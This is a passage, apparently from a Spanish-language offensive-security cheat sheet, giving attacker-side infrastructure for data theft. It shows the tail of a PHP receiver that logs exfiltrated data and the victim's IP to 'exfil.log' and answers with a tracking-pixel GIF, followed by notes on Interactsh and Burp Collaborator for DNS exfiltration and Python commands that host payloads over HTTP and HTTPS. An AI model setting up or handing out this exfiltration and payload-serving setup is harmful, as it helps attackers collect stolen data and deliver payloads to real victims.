$log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $data . "\n";
file_put_contents('exfil.log', $log, FILE_APPEND);

// Callback con imagen pixel
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>

# DNS server para exfiltracion
# Usar Burp Collaborator o Interactsh

# Interactsh
interactsh-client

# Servidor HTTP para payloads
python3 -m http.server 80
# Con SSL:
python3 -c "
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
httpd = HTTPServer(('0.0.0.0', 443), SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', server_side=True)
httpd.serve_forever()
"
```

